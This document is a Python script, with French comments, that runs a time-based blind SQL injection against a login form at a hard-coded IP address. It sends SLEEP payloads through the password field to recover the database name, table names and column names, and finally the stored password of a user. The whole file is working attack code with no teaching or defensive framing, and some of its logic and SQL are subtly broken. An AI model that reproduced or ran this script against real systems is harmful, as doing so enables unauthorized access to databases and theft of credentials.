import time
import requests


def db_name():
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    global db
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 99):
        for j in range(0, len(dictionary)):
            usr = "idc"
            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
            passwd = "' UNION SELECT SLEEP(5),1,2 where database() like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            print(a)
            if a > 27:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    db = texte
    return(texte)


def table_name():
    global table
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    tables_name=[]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for f in db :
        for i in range(1, 50):
            for j in range(0, len(dictionary)):
                if a > 27:
                    """enlever """
                    rm_letter = texte[0]
                    dictionary.remove(rm_letter)
                    print(dictionary)
                    tables_name.append(texte)
                    texte = ""
                    a=0
                    break
                usr = "idc"
                """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
                passwd = "' UNION SELECT SLEEP(5),1,2 TABLE_NAME FROM information_schema.tables WHERE table_schema='" + db + "' AND TABLE_NAME like '" + texte + dictionary[j] + "%' -- "
                print(passwd)
                start_time = time.time()
                response = requests.post(url, data={'username': usr, 'password': passwd})
                end_time = time.time()
                total_time = end_time - start_time
                """print(total_time)
                print(dictionary[j])"""
                a += 1
                print(texte)
                print(tables_name)
                print(a)
                
                if total_time >= TIME:
                    texte += dictionary[j]
                    print(texte)
                    i += 1
                    j = 0
                    a = 0
                    break
    table = table_name
    return(texte)

"""mettre iput avec nom de tables etc... ex 1:user     2: user_form"""
def column_name():
    global column
    print("je suis une merde")
    print(table)
    dictionary = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 99):
        for j in range(0, len(dictionary)):
            usr = "idc"
            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
            passwd = "' UNION SELECT SLEEP(5),1,2 COLUMN_NAME FROM information_schema.columns WHERE table_schema='" + db + "' AND TABLE_NAME='" + table + "' AND COLUMN_NAME like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            print(a)
            if a > 27:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    return(texte)


def dump_column():
    dictionary = ["0","1","2","3","3","4","5","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","_"]
    a=0
    texte = ""
    TIME = 5
    url = "http://51.15.136.118/pageid.php"
    for i in range(1, 99):
        for j in range(0, len(dictionary)):
            usr = "idc"
            """faire la meme chose avec les ,1,2 qui change en fonction du nombre de tables"""
            """passwd = "' UNION SELECT SLEEP(5),1,2 username FROM users WHERE username like '" + texte + dictionary[j] + "%' -- """
            passwd = "' UNION SELECT SLEEP(5),1,2 password FROM users WHERE username='test' AND password like '" + texte + dictionary[j] + "%' -- "
            print(passwd)
            start_time = time.time()
            response = requests.post(url, data={'username': usr, 'password': passwd})
            end_time = time.time()
            total_time = end_time - start_time
            """print(total_time)
            print(dictionary[j])"""
            a += 1
            print(a)
            if a > 27:
                break
            if total_time >= TIME:
                texte += dictionary[j]
                print(texte)
                i += 1
                j = 0
                a = 0
                break
    return(texte)


db_name()
table_name()
column_name()
dump_column()